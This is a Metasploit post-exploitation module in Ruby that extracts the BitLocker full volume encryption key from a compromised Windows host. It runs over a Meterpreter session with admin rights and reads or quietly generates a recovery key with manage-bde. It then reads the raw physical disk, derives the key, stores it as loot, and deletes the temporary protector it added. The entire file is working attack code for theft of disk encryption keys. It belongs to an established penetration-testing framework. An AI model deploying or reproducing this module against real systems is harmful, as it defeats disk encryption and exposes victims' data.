##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/parser/fs/bitlocker'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Error
  include Msf::Post::Windows::ExtAPI
  include Msf::Post::Windows::FileInfo
  include Msf::Post::File

  ERROR = Msf::Post::Windows::Error

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Bitlocker Master Key (FVEK) Extraction',
      'Description'  => %q{
        This module enumerates ways to decrypt Bitlocker volume and if a recovery key is stored locally
        or can be generated, dump the Bitlocker master key (FVEK)
      },
      'License'      => 'MSF_LICENSE',
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter'],
      'Author'       => ['Danil Bazin <danil.bazin[at]hsc.fr>'], # @danilbaz
      'References'   => [
        ['URL', 'https://github.com/libyal/libbde/blob/master/documentation/BitLocker Drive Encryption (BDE) format.asciidoc'],
        ['URL', 'http://www.hsc.fr/ressources/outils/dislocker/']
      ]
    ))

    register_options(
      [
        OptString.new('DRIVE_LETTER', [true, 'Dump informations from the DRIVE_LETTER encrypted with Bitlocker', nil]),
        OptString.new('RECOVERY_KEY', [false, 'Use the recovery key provided to decrypt the Bitlocker master key (FVEK)', nil])
      ])
  end

  def run
    file_path = session.sys.config.getenv('windir') << '\\system32\\win32k.sys'
    major, minor, _build, _revision, _branch = file_version(file_path)
    winver = (major.to_s + '.' + minor.to_s).to_f

    fail_with(Failure::NoTarget, 'Module not valid for OS older that Windows 7') if winver <= 6
    fail_with(Failure::NoAccess, 'You don\'t have administrative privileges') unless is_admin?

    drive_letter = datastore['DRIVE_LETTER']
    system_root = expand_path('%SYSTEMROOT%')

    cmd_out = cmd_exec('wmic', "logicaldisk #{drive_letter}: ASSOC:list /assocclass:Win32_LogicalDiskToPartition")

    @starting_offset = cmd_out.match(/StartingOffset=(\d+)/)[1].to_i

    drive_number = cmd_out.match(/DiskIndex=(\d+)/)[1]

    r = client.railgun.kernel32.CreateFileW("\\\\.\\PhysicalDrive#{drive_number}",
                                            'GENERIC_READ',
                                            'FILE_SHARE_DELETE|FILE_SHARE_READ|FILE_SHARE_WRITE',
                                            nil,
                                            'OPEN_EXISTING',
                                            'FILE_FLAG_WRITE_THROUGH',
                                            0)

    if r['GetLastError'] != ERROR::SUCCESS
      fail_with(Failure::Unknown,
        "Error opening #{drive_letter}. Windows Error Code: #{r['GetLastError']}
         - #{r['ErrorMessage']}")
    end

    @handle = r['return']
    print_good("Successfully opened Disk #{drive_number}")
    seek(0)

    if !datastore['RECOVERY_KEY'].nil?
      print_status('Using provided recovery key')
      recovery_key = datastore['RECOVERY_KEY']
    else
      print_status('Trying to gather a recovery key')

      manage_bde = "#{system_root}\\system32\\manage-bde.exe"
      unless exist?(manage_bde)
        manage_bde = "#{system_root}\\sysnative\\manage-bde.exe"
        unless exist?(manage_bde)
          fail_with(Failure::Unknown, 'manage-bde.exe not found')
        end
      end

      cmd_out = cmd_exec(manage_bde, "-protectors -get #{drive_letter}:")

      recovery_key = cmd_out.match(/((\d{6}-){7}\d{6})/)

      if !recovery_key.nil?
        recovery_key = recovery_key[1]
        print_good("Recovery key found : #{recovery_key}")
      else
        print_status('No recovery key found, trying to generate a new recovery key')
        cmd_out = cmd_exec(manage_bde,
                           "-protectors -add #{drive_letter}: -RecoveryPassword")
        recovery_key = cmd_out.match(/((\d{6}-){7}\d{6})/)
        id_key_tmp = cmd_out.match(/(\{[^\}]+\})/)
        if !recovery_key.nil?
          recovery_key = recovery_key[1]
          id_key_tmp = id_key_tmp[1]
          print_good("Recovery key generated successfully : #{recovery_key}")
        else
          print_error('Recovery Key generation failed')
          print_status('No recovery key can be used')
          return
        end
      end
    end

    begin
      @bytes_read = 0
      fs = Rex::Parser::BITLOCKER.new(self)
      print_status('The recovery key derivation usually take 20 seconds...')
      fvek = fs.fvek_from_recovery_password_dislocker(recovery_key)
      if !fvek.blank?
        stored_path = store_loot('windows.file', 'application/octet-stream',
                                 session, fvek)
        print_good("Successfuly extract FVEK in #{stored_path}")
        print_good('This hard drive could later be decrypted using : dislocker -k <key_file> ...')
      else
        print_error('Failed to generate FVEK, wrong recovery key?')
      end
    ensure
      unless id_key_tmp.nil?
        print_status('Deleting temporary recovery key')
        cmd_exec(manage_bde,
                 "-protectors -delete #{drive_letter}: -id #{id_key_tmp}")
      end
      client.railgun.kernel32.CloseHandle(@handle)
    end
    print_status('Post Successful')
  end

  def read(size)
    client.railgun.kernel32.ReadFile(@handle, size, size, 4, nil)['lpBuffer']
  end

  def seek(offset)
    offset += @starting_offset
    high_offset = offset >> 32
    low_offset = offset & (2**33 - 1)
    client.railgun.kernel32.SetFilePointer(@handle, low_offset, high_offset, 0)
  end
end
